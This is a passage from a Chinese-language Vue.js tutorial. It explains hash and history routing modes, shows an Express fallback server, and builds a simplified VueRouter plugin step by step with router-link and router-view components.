punctuation">(</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 返回主页</span><span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// this.$router.push({ name: 'Home' })</span></code></pre><h2 id="hash模式和history模式"><a href="#hash模式和history模式" class="headerlink" title="hash模式和history模式"></a>hash模式和history模式</h2><h3 id="history模式的使用"><a href="#history模式的使用" class="headerlink" title="history模式的使用"></a>history模式的使用</h3><ul><li>通过history.pushState()方法改变地址栏</li><li>监听popstate事件</li><li><p>根据当前路由地址找到对应组件进行重新渲染</p></li><li><p>History需要服务器的支持</p></li><li>单页应用中，服务端不存在<code>http:www.testurl.com/login</code>这样的地址会返回找不到该页面</li><li>在服务端应该除了静态资源外都返回单页应用的<code>index.html</code></li></ul><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 这是一个简单的 node 服务器</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 导入处理 history 模式的模块</span><span class="token keyword">const</span> history <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'connect-history-api-fallback'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 导入 express</span><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 注册处理 history 模式的中间件，一旦客户端请求不存在的地址，服务端都会返回单页的index.html</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">history</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 处理静态资源的中间件，网站根目录 ../web</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token keyword">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'../web'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 开启服务器，端口是 3000</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'服务器开启，端口：3000'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>同样的在nginx服务器中也可以配置返回<code>index.html</code>，客户端来判断路由地址对应展示内容。</p><h3 id="hash模式的使用"><a href="#hash模式的使用" class="headerlink" title="hash模式的使用"></a>hash模式的使用</h3><ul><li>URL中#后面的内容作为路径地址</li><li>监听hashchange事件</li><li>根据当前路由地址找到对应组件重新渲染</li></ul><h2 id="模拟实现-Vue-Route"><a href="#模拟实现-Vue-Route" class="headerlink" title="模拟实现 Vue Route"></a>模拟实现 Vue Route</h2><p>前置知识：</p><ul><li>vue的构建版本 </li></ul><blockquote><p>运行时版：不支持 template 模板，需要打包的时候提前编译，如果你打包的时候是用vue-loader 或者 vueify，将`*.vue文件内的templates编译成JavaScript代码， 你就不需要compiler, 可以使用 runtime-only版本编译。</p><p>完整版：包含运行时和编译器，体积比运行时版大10K左右，程序运行时把模板转换成render函数</p><p>vue-cli默认创建运行时版</p></blockquote><ul><li>slot插槽</li></ul><pre class=" language-html"><code class="language-html">    &lt;div id = "app">        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>aaa</span><span class="token punctuation">></span></span>            &lt;p slot = "s1">在上面的内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>            &lt;p slot = "s2">在下面的内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>aaa</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 子组件 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>aaa<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        &lt;div class = "aaa">            &lt;slot name = "s1"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>slot</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>我是aaa组件<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>            &lt;slot name = "s2"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>slot</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span></code></pre><ul><li>混入mixin</li></ul><pre class=" language-js"><code class="language-js">混入 <span class="token punctuation">(</span>mixin<span class="token punctuation">)</span> 提供了一种非常灵活的方式，来分发 Vue 组件中的可复用功能。一个混入对象可以包含任意组件选项。当组件使用混入对象时，所有混入对象的选项将被“混合”进入该组件本身的选项<span class="token comment" spellcheck="true">// 定义一个混入对象</span><span class="token keyword">var</span> myMixin <span class="token operator">=</span> <span class="token punctuation">{</span>  created<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  methods<span class="token punctuation">:</span> <span class="token punctuation">{</span>    hello<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'hello from mixin!'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 定义一个使用混入对象的组件</span><span class="token keyword">var</span> Component <span class="token operator">=</span> Vue<span class="token punctuation">.</span><span class="token function">extend</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  mixins<span class="token punctuation">:</span> <span class="token punctuation">[</span>myMixin<span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">var</span> component <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Component</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// => "hello from mixin!"</span></code></pre><ul><li>render函数</li></ul><blockquote><p>简单的说，在vue中我们使用模板HTML语法组建页面的，使用render函数我们可以用js语言来构建DOM</p><p>因为vue是虚拟DOM，所以在拿到template模板时也要转译成VNode的函数，而用render函数构建DOM，vue就免去了转译的过程。</p><p>当使用render函数描述虚拟DOM时，vue提供一个函数，这个函数是就构建虚拟DOM所需要的工具。官网上给他起了个名字叫createElement。还有约定的简写叫h,</p></blockquote><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>myslot</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>hello world<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>myslot</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>myslot<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">v-if</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>level<span class="token punctuation">=</span><span class="token punctuation">=</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>slot</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>slot</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">v-if</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>level<span class="token punctuation">=</span><span class="token punctuation">=</span>2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>slot</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>slot</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span> <span class="token attr-name">v-if</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>level<span class="token punctuation">=</span><span class="token punctuation">=</span>3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>slot</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>slot</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h4</span> <span class="token attr-name">v-if</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>level<span class="token punctuation">=</span><span class="token punctuation">=</span>4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>slot</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>slot</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h4</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span></code></pre><p>使用render函数将myslot动态生成</p><pre class=" language-js"><code class="language-js"><span class="token string">'myslot'</span><span class="token punctuation">:</span><span class="token punctuation">{</span>    render<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span>createElement<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'h'</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>level<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>$slot<span class="token punctuation">.</span><span class="token keyword">default</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//h(n),helloworld</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><ul><li>Vue.use(plugin, arguments)</li></ul><ul><li><p>参数：<code>plugin(Function | Object)</code></p></li><li><p>用法：<br> 如果vue安装的组件类型必须为<code>Function</code>或者是<code>Object</code></p><p>如果是个对象，必须提供<strong>install</strong>方法</p><p>如果是一个函数，会被直接当作<code>install</code>函数执行</p><p><code>install</code>函数接受参数，默认第一个参数为Vue,其后参数为注册组件时传入的<code>arguments</code></p></li></ul><p><strong>实现思路</strong></p><ul><li>创建VueRouter插件，静态方法 install<ul><li>判断插件是否已经被加载</li><li>当Vue加载时把传入的router对象挂载到Vue实例上</li></ul></li><li>创建VueRouter类<ul><li>初始化，options，routeMap，app</li><li>createRouteMap()遍历所有路由信息，把组件和路由的映射记录到routeMap对象中</li><li>注册popstate事件，当路由地址发生变化，重新记录当前路径</li><li>创建router-link和router-view组件</li><li>当路径改变时，在routerMap中找到对应的组件，渲染router-view</li></ul></li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> _Vue <span class="token operator">=</span> <span class="token keyword">null</span><span class="token keyword">class</span> <span class="token class-name">VueRouter</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Vue.use(VueRouter) 表示使用VueRouter插件，调用 install 方法</span>    <span class="token keyword">static</span> <span class="token function">install</span><span class="token punctuation">(</span>Vue<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//1 判断当前插件是否被安装</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>VueRouter<span class="token punctuation">.</span>install<span class="token punctuation">.</span>installed<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>        VueRouter<span class="token punctuation">.</span>install<span class="token punctuation">.</span>installed <span class="token operator">=</span> <span class="token boolean">true</span>        <span class="token comment" spellcheck="true">//2 把Vue的构造函数记录在全局，后面使用vue.component时会用到</span>        _Vue <span class="token operator">=</span> Vue        <span class="token comment" spellcheck="true">//3 把创建Vue的实例传入的router对象注入到Vue实例</span>        _Vue<span class="token punctuation">.</span><span class="token function">mixin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            <span class="token function">beforeCreate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>$options<span class="token punctuation">.</span>router<span class="token punctuation">)</span><span class="token punctuation">{</span>                    _Vue<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>$router <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>$options<span class="token punctuation">.</span>router <span class="token comment" spellcheck="true">// 给所有的vue实例添加     </span>                    <span class="token comment" spellcheck="true">// $ 一般是vue中自带的，和普通的属性没什么区别</span>                    <span class="token comment" spellcheck="true">// 在vue的原型上添加一个 $router，令其注册在vue实例上的 router</span>                    <span class="token comment" spellcheck="true">// 即等于 vue.$options.router</span>                <span class="token punctuation">}</span>             <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token function">constructor</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>options <span class="token operator">=</span> options        <span class="token keyword">this</span><span class="token punctuation">.</span>routeMap <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// observable</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>data <span class="token operator">=</span> _Vue<span class="token punctuation">.</span><span class="token function">observable</span><span class="token punctuation">(</span><span class="token punctuation">{</span>             current<span class="token punctuation">:</span><span class="token string">"/"</span>    <span class="token comment" spellcheck="true">// current记录当前路由地址，"/"为当前的默认路径，为响应式数据</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">createRouteMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">initComponent</span><span class="token punctuation">(</span>_Vue<span class="token punctuation">)</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">initEvent</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token function">createRouteMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//遍历所有的路由规则 吧路由规则解析成键值对的形式存储到routeMap中</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>options<span class="token punctuation">.</span>routes<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>route <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>routeMap<span class="token punctuation">[</span>route<span class="token punctuation">.</span>path<span class="token punctuation">]</span> <span class="token operator">=</span> route<span class="token punctuation">.</span>component        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">initComponent</span><span class="token punctuation">(</span>Vue<span class="token punctuation">)</span><span class="token punctuation">{</span>        Vue<span class="token punctuation">.</span><span class="token function">component</span><span class="token punctuation">(</span><span class="token string">"router-link"</span><span class="token punctuation">,</span><span class="token punctuation">{</span>            props<span class="token punctuation">:</span><span class="token punctuation">{</span>                to<span class="token punctuation">:</span>String            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token comment" spellcheck="true">// template: '&lt;a :href="to">&lt;slot>&lt;/slot>&lt;/a>'</span>            <span class="token comment" spellcheck="true">// &lt;router-link to="/blog">Blog&lt;/router-link> 就会把Blog替换插槽</span>            <span class="token comment" spellcheck="true">// 但是上面这种方式在运行时Vue不可用，不支持template</span>            <span class="token comment" spellcheck="true">// 完整版本的Vue就是把template编译成render函数，所以可以直接写render函数</span>            <span class="token function">render</span><span class="token punctuation">(</span>h<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token function">h</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 三个参数：标签，属性，子元素slot</span>                    attrs<span class="token punctuation">:</span><span class="token punctuation">{</span>                        href<span class="token punctuation">:</span><span class="token keyword">this</span><span class="token punctuation">.</span>to                    <span class="token punctuation">}</span><span class="token punctuation">,</span>                    on<span class="token punctuation">:</span><span class="token punctuation">{</span>                        click<span class="token punctuation">:</span><span class="token keyword">this</span><span class="token punctuation">.</span>clickhander                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>$slots<span class="token punctuation">.</span><span class="token keyword">default</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 默认插槽就是&lt;slot>&lt;/slot></span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            methods<span class="token punctuation">:</span><span class="token punctuation">{</span>                <span class="token function">clickhander</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span>                    history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">.</span>to<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// pushState改地址而且不向服务器发请求</span>                    <span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span>data<span class="token punctuation">.</span>current<span class="token operator">=</span><span class="token keyword">this</span><span class="token punctuation">.</span>to                    e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 阻止默认行为</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">const</span> self <span class="token operator">=</span> <span class="token keyword">this</span>        Vue<span class="token punctuation">.</span><span class="token function">component</span><span class="token punctuation">(</span><span class="token string">"router-view"</span><span class="token punctuation">,</span><span class="token punctuation">{</span>            <span class="token function">render</span><span class="token punctuation">(</span>h<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 获取组件</span>                <span class="token keyword">const</span> cm<span class="token operator">=</span>self<span class="token punctuation">.</span>routeMap<span class="token punctuation">[</span>self<span class="token punctuation">.</span>data<span class="token punctuation">.</span>current<span class="token punctuation">]</span> <span class="token comment" spellcheck="true">// current响应式数据，会重新渲染组件</span>                <span class="token keyword">return</span> <span class="token function">h</span><span class="token punctuation">(</span>cm<span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token function">initEvent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 点击浏览器的前进后退时，重新获取当前路径并记录到current</span>        window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"popstate"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>current <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>pathname        <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><ul><li>前端路由是实现单页应用的基础 </li><li>可以通过this.$router对象获取当前路由对象中信息</li><li><p>window.pushState不会触发popstate时间，浏览器前进后退时会触发</p></li><li><p>当浏览器地址的路由为#/artical，router-link to=”/artical/101”生成的超链接的class属性会被设置为exact-active-class中的类样式，因为exact-active-class是用来设置路由地址精确匹配元素的样式</p></li></ul><h2 id="模拟hash模式vueRouter"><a href="#模拟hash模式vueRouter" class="headerlink" title="模拟hash模式vueRouter"></a>模拟hash模式vueRouter</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> _Vue <span class="token operator">=</span> <span class="token keyword">null</span><span class="token keyword">class</span> <span class="token class-name">VueRouter</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Vue.use(VueRouter) 表示使用VueRouter插件，调用 install 方法</span>    <span class="token keyword">static</span> <span class="token function">install</span><span class="token punctuation">(</span>Vue<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//1 判断当前插件是否被安装</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>VueRouter<span class="token punctuation">.</span>install<span class="token punctuation">.</span>installed<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>        VueRouter<span class="token punctuation">.</span>install<span class="token punctuation">.</span>installed <span class="token operator">=</span> <span class="token boolean">true</span>        <span class="token comment" spellcheck="true">//2 把Vue的构造函数记录在全局，后面使用vue.component时会用到</span>        _Vue <span class="token operator">=</span> Vue        <span class="token comment" spellcheck="true">//3 把创建Vue的实例传入的router对象注入到Vue实例</span>        _Vue<span class="token punctuation">.</span><span class="token function">mixin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            <span class="token function">beforeCreate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>$options<span class="token punctuation">.</span>router<span class="token punctuation">)</span><span class="token punctuation">{</span>                    _Vue<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>$router <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>$options<span class="token punctuation">.</span>router <span class="token comment" spellcheck="true">// 给所有的vue实例添加     </span>                    <span class="token comment" spellcheck="true">// $ 一般是vue中自带的，和普通的属性没什么区别</span>                    <span class="token comment" spellcheck="true">// 在vue的原型上添加一个 $router，令其注册在vue实例上的 router</span>                    <span class="token comment" spellcheck="true">// 即等于 vue.$options.router</span>                <span class="token punctuation">}</span>             <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token function">constructor</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>options <span class="token operator">=</span> options        <span class="token keyword">this</span><span class="token punctuation">.</span>routeMap <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// observable</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>data <span class="token operator">=</span> _Vue<span class="token punctuation">.</span><span class="token function">observable</span><span class="token punctuation">(</span><span class="token punctuation">{</span>             current<span class="token punctuation">:</span><span class="token string">"/"</span>    <span class="token comment" spellcheck="true">// current记录当前路由地址，"/"为当前的默认路径，为响应式数据</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">createRouteMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">initComponent</span><span class="token punctuation">(</span>_Vue<span class="token punctuation">)</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">initEvent</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token function">createRouteMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//遍历所有的路由规则 吧路由规则解析成键值对的形式存储到routeMap中</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>options<span class="token punctuation">.</span>routes<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>route <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>routeMap<span class="token punctuation">[</span>route<span class="token punctuation">.</span>path<span class="token punctuation">]</span> <span class="token operator">=</span> route<span class="token punctuation">.</span>component        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">initComponent</span><span class="token punctuation">(</span>Vue<span class="token punctuation">)</span><span class="token punctuation">{</span>        Vue<span class="token punctuation">.</span><span class="token function">component</span><span class="token punctuation">(</span><span class="token string">"router-link"</span><span class="token punctuation">,</span><span class="token punctuation">{</span>            props<span class="token punctuation">:</span><span class="token punctuation">{</span>                to<span class="token punctuation">:</span>String            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token comment" spellcheck="true">// template: '&lt;a :href="to">&lt;slot>&lt;/slot>&lt;/a>'</span>            <span class="token comment" spellcheck="true">// &lt;router-link to="/blog">Blog&lt;/router-link> 就会把Blog替换插槽</span>            <span class="token comment" spellcheck="true">// 但是上面这种方式在运行时Vue不可用，不支持template</span>            <span class="token comment" spellcheck="true">// 完整版本的Vue就是把template编译成render函数，所以可以直接写render函数</span>            <span class="token function">render</span><span class="token punctuation">(</span>h<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token function">h</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 三个参数：标签，属性，子元素slot</span>                    attrs<span class="token punctuation">:</span><span class="token punctuation">{</span>                        href<span class="token punctuation">:</span> <span class="token string">'#'</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>to                    <span class="token punctuation">}</span><span class="token punctuation">,</span>                    on<span class="token punctuation">:</span><span class="token punctuation">{</span>                        click<span class="token punctuation">:</span><span class="token keyword">this</span><span class="token punctuation">.</span>clickhander                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>$slots<span class="token punctuation">.</span><span class="token keyword">default</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 默认插槽就是&lt;slot>&lt;/slot></span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            methods<span class="token punctuation">:</span><span class="token punctuation">{</span>                <span class="token function">clickhander</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span>                    window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash <span class="token operator">=</span> <span class="token string">'#'</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>to                    <span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span>data<span class="token punctuation">.</span>current<span class="token operator">=</span><span class="token keyword">this</span><span class="token punctuation">.</span>to                    e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 阻止默认行为</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">const</span> self <span class="token operator">=</span> <span class="token 